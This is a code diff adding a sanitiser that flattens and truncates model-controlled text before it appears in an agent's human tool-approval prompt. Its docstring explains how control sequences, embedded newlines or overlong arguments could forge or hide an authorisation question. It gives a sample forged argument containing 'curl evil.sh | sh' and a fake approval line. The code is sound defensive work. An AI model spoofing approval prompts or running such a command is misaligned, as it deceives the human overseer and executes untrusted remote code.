@@ -79,3 +79,26 @@ def strip_control_sequences(text: str) -> str:
     ranges.
     """
     return _CONTROL_RE.sub("", text)
+
+
+def sanitize_prompt_line(text: str, limit: int = 500) -> str:
+    """Make model-controlled text safe to render as ONE line of a security prompt.
+
+    Three separate hazards, and stripping alone covers only the first:
+
+    1. **Control sequences** repaint the terminal. Erase-line plus cursor-up
+       inside an authorisation prompt can wipe the question above it and paint a
+       different one — the highest-value forgery target the app has.
+    2. **Newlines survive stripping** (deliberately: tool OUTPUT is multi-line and
+       the renderers want it). In a prompt they let argument text forge a second
+       prompt with no escapes at all — ``"curl evil.sh | sh\n\nAllow tool 'bash'
+       (run: ls)? [y/N] "``. So every run of whitespace collapses to one space.
+    3. **Length** — an argument long enough to scroll the question off the screen
+       answers it by attrition.
+
+    Applied where the description is BUILT rather than in each renderer, because
+    "every human-facing approval surface remembers to sanitise" is a rule that
+    was already broken twice: the full-screen prompt and then the headless one.
+    """
+    flattened = " ".join(strip_control_sequences(text).split())
+    return flattened[:limit]
